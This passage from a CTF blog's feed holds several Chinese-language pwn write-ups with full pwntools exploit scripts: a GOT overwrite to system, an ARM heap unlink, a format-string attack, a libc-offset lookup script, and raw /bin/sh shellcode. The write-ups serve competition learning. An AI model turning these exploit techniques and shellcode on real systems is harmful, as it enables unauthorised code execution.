class="string">"puts"</span>]-libc.symbols[<span class="string">"system"</span>])</div><div class="line"><span class="keyword">print</span> <span class="string">"system_addr="</span>+hex(system_addr)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># change atoi to system</span></div><div class="line"></div><div class="line">payload = p64(rop.symbols[<span class="string">"free"</span>]+<span class="number">0x6</span>) </div><div class="line">payload +=p64(rop.symbols[<span class="string">"puts"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"__stack_chk_fail"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"setbuf"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"printf"</span>]+<span class="number">0x6</span>) </div><div class="line">payload +=p64(rop.symbols[<span class="string">"alarm"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"read"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"__libc_start_main"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"malloc"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(system_addr)<span class="comment"># change atoi to printf (we can use fmt to leak address</span></div><div class="line">payload +=p64(rop.symbols[<span class="string">"__isoc99_scanf"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"alarm"</span>]+<span class="number">0x6</span>) <span class="comment"># change exit to alarm</span></div><div class="line"></div><div class="line"></div><div class="line">sd(<span class="string">"aa"</span>) <span class="comment"># I have changed atoi to printf,so it return the number of my input chars</span></div><div class="line">ru(<span class="string">"lings\n"</span>)</div><div class="line">sd(payload)</div><div class="line"></div><div class="line">ru(<span class="string">"feet\n"</span>)</div><div class="line">sd(<span class="string">"/bin/sh\x00"</span>)</div><div class="line"></div><div class="line">p.interactive()</div><div class="line"></div><div class="line"><span class="comment"># it's a funny pwn ~~~</span></div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;槽点：这次比赛。。敢不敢。。不放原题。。。做了半天的pwn2，结果是原题。。。 T T  （题目来自hitcon 2016，好吧。。怪我没刷到这题。。&lt;/p&gt;
&lt;p&gt;不过pwn1和pwn2收获都很大，特别记录下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>arm_double_free_attack</title>
    <link href="https://winter3un.github.io/2017/04/10/arm-double-free-attack/"/>
    <id>https://winter3un.github.io/2017/04/10/arm-double-free-attack/</id>
    <published>2017-04-10T15:50:31.000Z</published>
    <updated>2017-04-10T15:56:55.000Z</updated>
    
    <content type="html"><![CDATA[<p>题目来源自 X-NUCA 2016的note题目。题目资料全都可以从我的github上下载。</p><p>简单的堆溢出题目，但是环境在arm上，有一些小坑，比如说0x200的chunk在这边行不通了，只能用0x100的chunk，0x200好像比变成了large chunk，果然基础弱渣在这里是无法生存的。。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-09 08:34:41</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="comment"># import roputils</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line">target = <span class="string">"./note"</span></div><div class="line">remote_ip = <span class="string">""</span></div><div class="line">port = <span class="number">0</span></div><div class="line"><span class="comment"># rop = roputils.ROP(target)</span></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target)</div><div class="line"><span class="comment"># gdb.attach(p,"b*main\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(length,data)</span>:</span></div><div class="line">ru(<span class="string">"6. Exit"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line"><span class="comment"># raw_input()</span></div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(str(length))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(index)</span>:</span></div><div class="line">ru(<span class="string">"6. Exit"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line">ru(<span class="string">"the id:"</span>)</div><div class="line">sl(str(index))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,data)</span>:</span></div><div class="line">ru(<span class="string">"6. Exit"</span>)</div><div class="line">sl(<span class="string">"5"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(str(index))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_anyaddr</span><span class="params">(addr,data)</span>:</span></div><div class="line">edit(<span class="number">1</span>,p32(<span class="number">0</span>)+p32(addr))</div><div class="line">edit(<span class="number">0</span>,data)</div><div class="line"></div><div class="line"><span class="comment"># stage 1 unlink</span></div><div class="line">add(<span class="number">0</span>,<span class="string">"a"</span>*<span class="number">0x8</span>)<span class="comment">#0</span></div><div class="line">add(<span class="number">0x100</span>,<span class="string">"aaa"</span>)<span class="comment">#1  &gt;=0x200会使用large chunk</span></div><div class="line">add(<span class="number">0x100</span>,<span class="string">"aaa"</span>)<span class="comment">#2</span></div><div class="line">add(<span class="number">0x100</span>,<span class="string">"/bin/sh\x00"</span>)<span class="comment">#3</span></div><div class="line">junk = <span class="string">"\x00"</span>*<span class="number">8</span></div><div class="line">head = p32(<span class="number">0</span>)*<span class="number">2</span></div><div class="line">fake_head = p32(<span class="number">0</span>)+p32(<span class="number">0x101</span>)</div><div class="line">fd = p32(<span class="number">0x1205C</span>+<span class="number">0x8</span><span class="number">-0xc</span>)</div><div class="line">bk = p32(<span class="number">0x1205C</span>+<span class="number">0x8</span><span class="number">-0x8</span>)</div><div class="line">payload  = junk+head</div><div class="line">payload += fake_head+fd+bk</div><div class="line">payload += <span class="string">"a"</span>*(<span class="number">0x100</span>-len(fake_head+fd+bk))</div><div class="line">payload += p32(<span class="number">0x100</span>)+p32(<span class="number">0x108</span>)</div><div class="line">edit(<span class="number">0</span>,payload)</div><div class="line">raw_input()</div><div class="line">dele(<span class="number">2</span>)</div><div class="line"></div><div class="line"><span class="comment"># stage 2 edit free_got</span></div><div class="line">edit_anyaddr(<span class="number">0x12024</span>,p32(<span class="number">0x8538</span>)[:<span class="number">-1</span>])<span class="comment">#有零字节溢出，会破坏下一个got</span></div><div class="line">dele(<span class="number">3</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;题目来源自 X-NUCA 2016的note题目。题目资料全都可以从我的github上下载。&lt;/p&gt;
&lt;p&gt;简单的堆溢出题目，但是环境在arm上，有一些小坑，比如说0x200的chunk在这边行不通了，只能用0x100的chunk，0x200好像比变成了large chun
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
    
      <category term="heap overflow" scheme="https://winter3un.github.io/tags/heap-overflow/"/>
    
      <category term="arm" scheme="https://winter3un.github.io/tags/arm/"/>
    
  </entry>
  
  <entry>
    <title>【pwn】 初探pwntools fmt特性</title>
    <link href="https://winter3un.github.io/2017/04/09/%E5%88%9D%E6%8E%A2pwntools-fmt%E7%89%B9%E6%80%A7/"/>
    <id>https://winter3un.github.io/2017/04/09/初探pwntools-fmt特性/</id>
    <published>2017-04-09T15:16:41.000Z</published>
    <updated>2017-04-09T15:18:15.000Z</updated>
    
    <content type="html"><![CDATA[<p>翻pwntools文档的时候突然发现了pwntools多了一个自动完成fmt漏洞利用的特性。</p><p>官方文档链接  <a href="http://pwntools.readthedocs.io/en/stable/fmtstr.html" target="_blank" rel="external">http://pwntools.readthedocs.io/en/stable/fmtstr.html</a></p><p>在本地一看，pwntools还是2.x版本。。官方都已经更新到3.5版本了，于是果断更新= =。。</p><p>漏洞程序是这样子的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+1Ch] [bp-184h]@2</span></div><div class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+9Ch] [bp-104h]@2</span></div><div class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+11Ch] [bp-84h]@2</span></div><div class="line">  <span class="keyword">int</span> v6; <span class="comment">// [sp+19Ch] [bp-4h]@1</span></div><div class="line"></div><div class="line">  v6 = *MK_FP(__GS__, <span class="number">20</span>);</div><div class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</div><div class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</div><div class="line">  print_welcome();</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"First input:"</span>);</div><div class="line">    get_input(<span class="number">256</span>, &amp;v3);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Second input:"</span>);</div><div class="line">    get_input(<span class="number">256</span>, &amp;v4);</div><div class="line">    <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)&amp;v5, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3);</div><div class="line">    <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v5);</div><div class="line">    <span class="built_in">putchar</span>(<span class="number">44</span>);</div><div class="line">    <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4);</div><div class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"All is Done"</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>可以直接看到，有两处fmt漏洞，这是个循环，我们只需要循环利用其中一个fmt漏洞就可以。</p><p>我们可以利用pwntools提供fmt自动利用的功能快速算出格式化字符串在栈中的偏移。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># stage 1 get fmt offset</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span><span class="params">(payload)</span>:</span></div><div class="line">p = process(target)</div><div class="line">p.recvuntil(<span class="string">"input:"</span>)</div><div class="line">p.sendline(payload)</div><div class="line">p.recvuntil(<span class="string">"input:"</span>)</div><div class="line">p.sendline(payload)</div><div class="line"><span class="keyword">return</span> p.recvuntil(<span class="string">","</span>)[:<span class="number">-1</span>]</div><div class="line"></div><div class="line">autofmt = FmtStr(exec_fmt)</div><div class="line">offset = autofmt.offset</div></pre></td></tr></table></figure><p>泄露出其中一个库函数地址后，利用我们本地搭建好的libc-database库算出system函数的地址。(如果出现多个匹配的话，就爆破吧:P</p><p>主要的还是它可以自动完成任意地址写的payload，就适合我这种深度懒癌患者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_payload</span><span class="params">(payload)</span>:</span></div><div class="line">ru(<span class="string">"input:"</span>)</div><div class="line">sl(payload)</div><div class="line">ru(<span class="string">"input:"</span>)</div><div class="line">sl(<span class="string">"/bin/sh\x00"</span>)</div><div class="line">autofmt = FmtStr(send_payload,offset=offset)</div><div class="line">autofmt.write(printf_got,system_addr)</div><div class="line">autofmt.execute_writes()</div></pre></td></tr></table></figure><p>总的exp是这样子的。大概爆破三次就出结果，这还是我只泄露了一个库函数地址的情况下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-08 21:08:57</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line">target = <span class="string">"./echo"</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line">bss = rop.section(<span class="string">'.bss'</span>)+<span class="number">0x30</span></div><div class="line">printf_got = rop.got(<span class="string">'printf'</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target)</div><div class="line"><span class="comment"># gdb.attach(p,"b*0x80486C1\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="comment"># stage 1 get fmt offset</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span><span class="params">(payload)</span>:</span></div><div class="line">p = process(target)</div><div class="line">p.recvuntil(<span class="string">"input:"</span>)</div><div class="line">p.sendline(payload)</div><div class="line">p.recvuntil(<span class="string">"input:"</span>)</div><div class="line">p.sendline(payload)</div><div class="line"><span class="keyword">return</span> p.recvuntil(<span class="string">","</span>)[:<span class="number">-1</span>]</div><div class="line"></div><div class="line">autofmt = FmtStr(exec_fmt)</div><div class="line">offset = autofmt.offset</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_payload</span><span class="params">(payload)</span>:</span></div><div class="line">ru(<span class="string">"input:"</span>)</div><div class="line">sl(payload)</div><div class="line">ru(<span class="string">"input:"</span>)</div><div class="line">sl(<span class="string">"/bin/sh\x00"</span>)</div><div class="line"></div><div class="line"><span class="comment"># stage 2 get system_addr</span></div><div class="line"></div><div class="line">offset_system = [<span class="number">-63744</span>, <span class="number">-78400</span>, <span class="number">-55008</span>, <span class="number">-57072</span>, <span class="number">-55136</span>, <span class="number">-61392</span>, <span class="number">-55120</span>, <span class="number">-59840</span>, <span class="number">-64784</span>, <span class="number">-59456</span>, <span class="number">-58400</span>, <span class="number">-58480</span>, <span class="number">-60464</span>, <span class="number">-76112</span>, <span class="number">3792</span>, <span class="number">-70432</span>, <span class="number">-58160</span>, <span class="number">-1063904</span>, <span class="number">-1042576</span>, <span class="number">-1041936</span>, <span class="number">-68192</span>, <span class="number">-77448</span>, <span class="number">-51488</span>, <span class="number">-71904</span>]</div><div class="line"><span class="keyword">for</span> o <span class="keyword">in</span> offset_system:</div><div class="line"><span class="keyword">try</span>:</div><div class="line">p = process(target)</div><div class="line">printf_got = rop.got(<span class="string">"printf"</span>)</div><div class="line">puts_got = rop.got(<span class="string">"puts"</span>)</div><div class="line"></div><div class="line">ru(<span class="string">"input:"</span>)</div><div class="line">sl(p32(printf_got)+<span class="string">"%7$s"</span>)</div><div class="line">ru(<span class="string">"input:"</span>)</div><div class="line">sl(<span class="string">"payload"</span>)</div><div class="line"></div><div class="line">printf_addr = u32(p.recv(<span class="number">8</span>)[<span class="number">4</span>:])</div><div class="line"></div><div class="line">ru(<span class="string">"input:"</span>)</div><div class="line">sl(p32(puts_got)+<span class="string">"%7$s"</span>)</div><div class="line">ru(<span class="string">"input:"</span>)</div><div class="line">sl(<span class="string">"payload"</span>)</div><div class="line"></div><div class="line">puts_addr = u32(p.recv(<span class="number">8</span>)[<span class="number">4</span>:])</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"printf_addr="</span>+hex(printf_addr)</div><div class="line"><span class="keyword">print</span> <span class="string">"puts_addr="</span>+hex(puts_addr)</div><div class="line"></div><div class="line"></div><div class="line">system_addr = printf_addr+o</div><div class="line"></div><div class="line"><span class="comment"># stage 3 change printf_addr to system_addr</span></div><div class="line">autofmt = FmtStr(send_payload,offset=offset)</div><div class="line">autofmt.write(printf_got,system_addr)</div><div class="line">autofmt.execute_writes()</div><div class="line"><span class="comment"># print offset</span></div><div class="line"><span class="comment"># print "bss_addr="+hex(bss)</span></div><div class="line"><span class="comment"># payload = fmtstr_payload(1,&#123;bss:0xdeadbeaf&#125;,1,"byte")</span></div><div class="line"><span class="comment"># print payload</span></div><div class="line"></div><div class="line">p.interactive()</div><div class="line"><span class="keyword">except</span>:</div><div class="line"><span class="keyword">continue</span></div></pre></td></tr></table></figure><p>后记：啥时候出个FSP自动利用的啊。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;翻pwntools文档的时候突然发现了pwntools多了一个自动完成fmt漏洞利用的特性。&lt;/p&gt;
&lt;p&gt;官方文档链接  &lt;a href=&quot;http://pwntools.readthedocs.io/en/stable/fmtstr.html&quot; target=&quot;_bla
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
    
      <category term="pwntools" scheme="https://winter3un.github.io/tags/pwntools/"/>
    
      <category term="fmt" scheme="https://winter3un.github.io/tags/fmt/"/>
    
  </entry>
  
  <entry>
    <title>how_to_get_libc</title>
    <link href="https://winter3un.github.io/2017/04/08/how-to-get-libc/"/>
    <id>https://winter3un.github.io/2017/04/08/how-to-get-libc/</id>
    <published>2017-04-08T07:29:54.000Z</published>
    <updated>2017-05-22T16:58:15.000Z</updated>
    
    <content type="html"><![CDATA[<p>比赛的时候，遇到比较坑爹的情况，没有提供给libc库，这个时候就需要用各种姿势去泄露libc库。</p><p>1、询问组委会，是否提供libc库，很有可能就放提示了</p><p>2、通过return2libc技巧，泄露got内保存的库函数地址，去 <a href="http://libcdb.com/" target="_blank" rel="external">http://libcdb.com/</a>  找对应的库版本，这边我写了一个get_libc的小脚本（但并不是百分之一百能找到的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="comment"># a_name = raw_input('input a_name= ')</span></div><div class="line"><span class="comment"># a_addr = raw_input('input a_addr=')</span></div><div class="line"><span class="comment"># b_name = raw_input('input b_name=')</span></div><div class="line"><span class="comment"># b_addr = raw_input('input b_addr=')</span></div><div class="line"><span class="comment"># a_name= 'read'</span></div><div class="line"><span class="comment"># a_addr='0xb76a9bd0'</span></div><div class="line"><span class="comment"># b_name='shutdown'</span></div><div class="line"><span class="comment"># b_addr='0xb76bc610'</span></div><div class="line">a_name=<span class="string">'printf'</span></div><div class="line">a_addr=<span class="string">'0x7f0ff5dadba0'</span></div><div class="line">b_name=<span class="string">'read'</span></div><div class="line">b_addr=<span class="string">'0x7f0ff5e50470'</span></div><div class="line"></div><div class="line">may_system_offset=[]</div><div class="line">url = <span class="string">'http://libcdb.com/search?symbolA='</span>+a_name+<span class="string">'&amp;addressA='</span>+a_addr+<span class="string">'&amp;symbolB='</span>+b_name+<span class="string">'&amp;addressB='</span>+b_addr</div><div class="line">r1 = get(url)</div><div class="line">list_ = re.findall(<span class="string">r'&lt;li&gt;&lt;a href="(.*?)"&gt;Libc\:'</span>,r1.content)</div><div class="line">payload = <span class="string">'may_system_offset = ['</span></div><div class="line"><span class="keyword">if</span> len(list_)&gt;<span class="number">0</span>:</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> list_:</div><div class="line">url = <span class="string">'http://libcdb.com'</span>+x+<span class="string">'/symbols?name=__libc_system'</span></div><div class="line">system_offset = get(url)</div><div class="line">system_offset = re.findall(<span class="string">r'/dt&gt;\n        &lt;dd&gt;(.*?)&lt;/dd&gt;\n        \n    &lt;/dl&gt;'</span>,system_offset.content)[<span class="number">0</span>].replace(<span class="string">'libc_base + 0x'</span>,<span class="string">''</span>)</div><div class="line"><span class="keyword">print</span> system_offset</div><div class="line">url = <span class="string">'http://libcdb.com'</span>+x+<span class="string">'/symbols?name='</span>+b_name</div><div class="line">func_offset = get(url)</div><div class="line"><span class="comment"># print func_offset.content</span></div><div class="line">func_offset = re.findall(<span class="string">r'&gt;'</span>+b_name+<span class="string">'&lt;/dt&gt;\n        &lt;dd&gt;(.*?)&lt;/dd&gt;'</span>,func_offset.content)[<span class="number">0</span>].replace(<span class="string">'libc_base + 0x'</span>,<span class="string">''</span>)</div><div class="line">may_system_offset.append(int(system_offset,<span class="number">16</span>)-int(func_offset,<span class="number">16</span>))</div><div class="line">may_system_offset = list(set(may_system_offset))</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> may_system_offset:</div><div class="line">payload += hex(x)+<span class="string">','</span></div><div class="line">payload = payload[:<span class="number">-1</span>]</div><div class="line"><span class="keyword">print</span> payload+<span class="string">']'</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line"><span class="keyword">print</span> <span class="string">'oops! nothing!'</span></div><div class="line"></div><div class="line">raw_input()</div></pre></td></tr></table></figure><p>3、利用return to dl resolve技术，这个已经有成熟的辅助工具了。<a href="https://github.com/inaz2/roputils" target="_blank" rel="external">https://github.com/inaz2/roputils</a></p><p>4、利用其他题目的libc库，出题人为了方便，很有可能用的相同libc库</p><p>5、利用pwntools提供的dynelf函数来寻找system地址，不过需要有个leak函数。可参考 <a href="http://bobao.360.cn/learning/detail/3298.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3298.html</a> （蛋疼的是，不知道为啥我的ELF()函数一直是坏的。</p><hr><p>2017/5/23日添加</p><p>6、泄露Smallbin的FD、BK进行libc base获取</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;比赛的时候，遇到比较坑爹的情况，没有提供给libc库，这个时候就需要用各种姿势去泄露libc库。&lt;/p&gt;
&lt;p&gt;1、询问组委会，是否提供libc库，很有可能就放提示了&lt;/p&gt;
&lt;p&gt;2、通过return2libc技巧，泄露got内保存的库函数地址，去 &lt;a href=&quot;ht
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【pwn】T3CTF2017 堆溢出以及return to  dl slove</title>
    <link href="https://winter3un.github.io/2017/04/08/T3CTF2017/"/>
    <id>https://winter3un.github.io/2017/04/08/T3CTF2017/</id>
    <published>2017-04-08T07:26:51.000Z</published>
    <updated>2017-04-08T07:51:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>pwn1，没什么好说的，看了下checksec，NX没开，栈迁移以后直接执行bss上的shellcode就可以了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> pwn</div><div class="line"></div><div class="line">p = pwn.remote(<span class="string">"127.0.0.1"</span>,<span class="number">12346</span>)</div><div class="line">addr_bss = <span class="number">0x0804A080</span></div><div class="line">buf =  p32(<span class="number">0x0804A080</span>+<span class="number">4</span>)+<span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"</span></div><div class="line">buf += (<span class="number">0x1f4</span>-len(buf))*<span 